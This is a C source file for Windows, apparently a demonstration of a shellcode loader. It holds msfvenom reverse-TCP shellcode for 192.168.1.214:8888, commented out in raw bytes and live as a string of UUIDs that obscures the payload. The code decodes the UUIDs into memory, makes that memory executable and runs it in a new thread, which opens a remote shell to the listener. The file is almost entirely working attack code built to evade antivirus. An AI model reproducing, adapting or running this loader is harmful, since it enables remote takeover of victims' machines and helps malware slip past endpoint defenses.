#include <Windows.h>
#include "payload-obfuscation-uuid-lib.h"
#include "misc.h"


int main()
{
    /*
    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.214 LPORT=8888 -f c
    BYTE pbPayload[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
        "\x00\x49\x89\xe5\x49\xbc\x02\x00\x22\xb8\xc0\xa8\x01\xd6"
        "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
        "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
        "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
        "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
        "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
        "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
        "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
        "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
        "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
        "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
        "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
        "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
        "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
        "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
        "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
        "\xca\xbc\xcc\xdc";                                         // padding (% 16 == 0)
    */
    WCHAR psPayloadUUID[] = L"e48348fc-e8f0-00c0-0000-415141505251,d2314856-4865-528b-6048-8b5218488b52,728b4820-4850-b70f-4a4a-4d31c94831c0,7c613cac-2c02-4120-c1c9-0d4101c1e2ed,48514152-528b-8b20-423c-4801d08b8088,48000000-c085-6774-4801-d0508b481844,4920408b-d001-56e3-48ff-c9418b348848,314dd601-48c9-c031-ac41-c1c90d4101c1,f175e038-034c-244c-0845-39d175d85844,4924408b-d001-4166-8b0c-48448b401c49,8b41d001-8804-0148-d041-5841585e595a,59415841-5a41-8348-ec20-4152ffe05841,8b485a59-e912-ff57-ffff-5d49be777332,0032335f-4100-4956-89e6-4881eca00100,e5894900-bc49-0002-22b8-c0a801d64154,4ce48949-f189-ba41-4c77-2607ffd54c89,010168ea-0000-4159-ba29-806b00ffd550,c9314d50-314d-48c0-ffc0-4889c248ffc0,41c18948-eaba-df0f-e0ff-d54889c76a10,894c5841-48e2-f989-41ba-99a57461ffd5,40c48148-0002-4900-b863-6d6400000000,41504100-4850-e289-5757-574d31c06a0d,e2504159-66fc-44c7-2454-0101488d4424,6800c618-8948-56e6-5041-504150415049,5041c0ff-ff49-4dc8-89c1-4c89c141ba79,ff863fcc-48d5-d231-48ff-ca8b0e41ba08,ff601d87-bbd5-b5f0-a256-41baa695bd9d,8348d5ff-28c4-063c-7c0a-80fbe07505bb,6f721347-006a-4159-89da-ffd5cabcccdc,";
    
    SIZE_T ulPayload = 464;     // bin payload + padding  
    PVOID pbPayload = NULL;
    
    BOOL bRet = FALSE;


    do
    {
        wprintf(L"[i] Allocating memory... ");
        pbPayload = VirtualAlloc(NULL, ulPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pbPayload == NULL)
        {
            printError(L"VirtualAlloc");
            break;
        }
        wprintf(L"done\n");


        wprintf(L"[i] Decoding payload... ");
        bRet = UUIDsToPayload(psPayloadUUID, (PBYTE)pbPayload, ulPayload);
        if (!bRet)
        {
            break;
        }
        wprintf(L"done\n");


        wprintf(L"[i] Adding EXECUTE flag for allocated memory... ");
        DWORD dwOldProtection = NULL;

        bRet = VirtualProtect(pbPayload, ulPayload, PAGE_EXECUTE_READ, &dwOldProtection);
        if (!bRet)
        {
            printError(L"VirtualProtect");
            break;
        }
        wprintf(L"done\n");


        wprintf(L"[i] Executing payload... ");
        // (*(VOID(*)()) pbPayload)();

        HANDLE hThread = NULL;
        hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pbPayload, NULL, NULL, NULL);
        
        WaitForSingleObject(hThread, 2000);
        
        if (!hThread)
        {
            printError(L"CreateThread");
            break;
        }
        wprintf(L"done\n");

    } while (FALSE);

    wprintf(L"[i] Releasing allocated memory... ");
    if (pbPayload)
    {
        if (!VirtualFree(pbPayload, 0, MEM_RELEASE))
        {
            printError(L"VirtualFree");
            return -1;
        }
    }
    wprintf(L"done\n");


    return 0;
}